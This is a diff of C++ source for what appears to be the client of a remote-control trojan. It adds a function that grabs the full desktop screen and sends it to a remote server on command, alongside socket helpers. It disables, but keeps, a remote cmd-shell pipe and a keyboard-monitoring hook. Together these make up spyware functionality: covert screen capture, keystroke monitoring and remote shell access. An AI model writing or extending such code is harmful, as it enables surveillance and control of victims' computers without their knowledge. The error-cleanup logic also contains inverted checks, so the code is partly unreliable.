@@ -4,6 +4,132 @@ extern BOOL iskeyHook;
 extern HANDLE myIn;
 extern  HANDLE myOut;
 
+
+//发送头
+BOOL sendData(SOCKET s, LPCVOID data, DWORD len) {
+
+
+	if (s == INVALID_SOCKET)
+		return FALSE;
+	int countlen = 0;//发送的总长
+	while (countlen < len) {
+		int n = send(s, ((char*)data) + countlen, len-countlen, 0);//单次发送的长度
+		if (n <= 0)
+			return FALSE;
+		else {
+			countlen += n;
+		}
+	}
+	return TRUE;
+}
+
+
+BOOL sendData(SOCKET s, DWORD code, LPCVOID data, DWORD len) {
+	PackHeader PH;
+	PH.type = code;
+	PH.length = len;
+	if (s == INVALID_SOCKET || data == NULL || len == 0)
+		return FALSE;
+	int countlen = 0;//发送的总长
+	while (countlen < len) {
+		int n = send(s, ((char*)data) + countlen, len - countlen, 0);//单次发送的长度
+		if (n <= 0)
+			return FALSE;
+		else {
+			countlen += n;
+		}
+	}
+	return TRUE;
+}
+
+
+
+
+
+BOOL recvData(SOCKET s, LPCVOID data, DWORD len) {
+
+	if (s == INVALID_SOCKET || data == NULL || len == 0)
+		return FALSE;
+
+	int countlen = 0;//接受的总长
+
+	while (countlen < len) {
+		int n = recv(s, ((char*)data) + countlen, len - countlen, 0);//单次接受的长度
+		if (n <= 0)
+			return FALSE;
+		else {
+			countlen += n;
+		}
+	}
+	return TRUE;
+}
+
+
+
+VOID GetScreen(SOCKET s) {
+	HDC deskDC;
+	HDC deskcompDC;
+	HBITMAP deskcompBitemap;
+	//先获取screen的width和height
+	int hWidth = GetSystemMetrics(SM_CXSCREEN);
+	int hHeight = GetSystemMetrics(SM_CYSCREEN);
+	//定义位图大小 宽*高*4
+	int size = hWidth * hHeight * 4;
+	//定义存放的缓冲区
+	char* buf = new char[size+8];
+	memcpy(buf, &hWidth, sizeof(hWidth));
+	memcpy(buf + sizeof(hWidth), &hHeight, sizeof(hHeight));
+
+	try {
+		
+
+		//获取桌面源DC
+		 deskDC = GetDC(GetDesktopWindow());
+		 if (!deskDC)
+			 throw deskDC;
+		//创建兼容的内存DC
+		 deskcompDC = CreateCompatibleDC(deskDC);
+		 if (!deskcompDC)
+			 throw deskcompDC;
+		//创建兼容位图
+		 deskcompBitemap = CreateCompatibleBitmap(deskDC, hWidth, hHeight);
+		 if (!deskcompBitemap)
+			 throw deskcompBitemap;
+		//关联内存DC和位图
+		SelectObject(deskcompDC, deskcompBitemap);
+		//把源桌面DC拷贝内存DC
+		BitBlt(deskcompDC, 0, 0, hWidth, hHeight, deskDC, 0, 0, SRCCOPY);
+	
+	
+		//获取位图数据
+		GetBitmapBits(deskcompBitemap, size, buf+8);
+	}
+	catch (...) {
+		if (!deskDC)
+			ReleaseDC(GetDesktopWindow(), deskDC);
+		if (!deskcompDC)
+			DeleteDC(deskcompDC);
+		if (!deskcompBitemap)
+			DeleteObject(deskcompBitemap);
+		return;
+	}
+	//如果获取成功就会来这里
+
+	//在这里向服务器发送数据
+	PackHeader PH;
+	PH.type = CTOS_SCREENT;
+	PH.length = size + 8;
+	sendData(s,&PH, sizeof(PH));//先发送头
+	sendData(s, PH.type, buf, PH.length);
+	//发送完毕释放DC等数据
+	ReleaseDC(GetDesktopWindow(), deskDC);
+	DeleteDC(deskcompDC);
+	DeleteObject(deskcompBitemap);
+	delete[] buf;
+
+
+}
+
 SOCKET InitSock() {
 	WSAData wsaData;
 	WSAStartup(0x0202, &wsaData);
@@ -70,12 +196,11 @@ BOOL InitPipe(HANDLE* myin, HANDLE* myout, DWORD* prcessid ) {
 	return TRUE;
 
 }
-
 VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
 	DWORD Len = strlen(lpStr);
 	int i = 0;
 	PackHeader PH;
-	PH.type = eCmd;
+	//PH.type = eCmd;
 	char wbuf[256] = {0};
 	memcpy(wbuf, lpStr, Len);
 	wbuf[Len] = '\n';
@@ -96,7 +221,7 @@ VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
 			break;
 		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
 		PH.length = strlen(rbuf)+1;
-		PH.type = eCmd;
+		//PH.type = eCmd;
 		
 		memcpy(Packbuf, &PH, sizeof(PackHeader));
 		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
@@ -121,7 +246,7 @@ VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
 		if (!haveByte)
 			break;
 		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
-		PH.type = eCmd;
+	//	PH.type = eCmd;
 		PH.length = strlen(rbuf) + 1;
 		memcpy(Packbuf, &PH, sizeof(PackHeader));
 		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
@@ -137,13 +262,22 @@ VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
 DWORD _stdcall proceThread(LPVOID p) {
 	while (TRUE) {
 		SOCKET s = (SOCKET)p;
-		DWORD cmdcode = 0;
-		char command[128] = { 0 };
-		int n = recv(s, (char*)&cmdcode, sizeof(cmdcode), 0);
+		char Databuf[256] = { 0 };
+		PackHeader PH;
+		recvData(s, &PH, sizeof(PackHeader));
+		if (PH.length > 0) {
+			//说明服务器有数据发过来在这里接受
+			//recvData(s, Databuf, PH.length);
+		}
 
-		switch (cmdcode)
+		switch (PH.type)
 		{
-		case eCmd:{
+		case STOC_SCREENT:{
+							  //获取桌面数据然后在函数里发送给服务器
+							  GetScreen(s);
+
+		}break;
+		/*case eCmd:{
 					  iskeyHook = FALSE;
 				   recv(s,(char*) command, sizeof(command)-1, 0);
 				  
@@ -151,10 +285,11 @@ DWORD _stdcall proceThread(LPVOID p) {
 		}break;
 		case eKeyboard:{//键盘监控程序
 						   iskeyHook = TRUE;
-		}break;
+		}break;*/
 		default:break;
 
 		}
+		PH = {0};
 
 	}
 
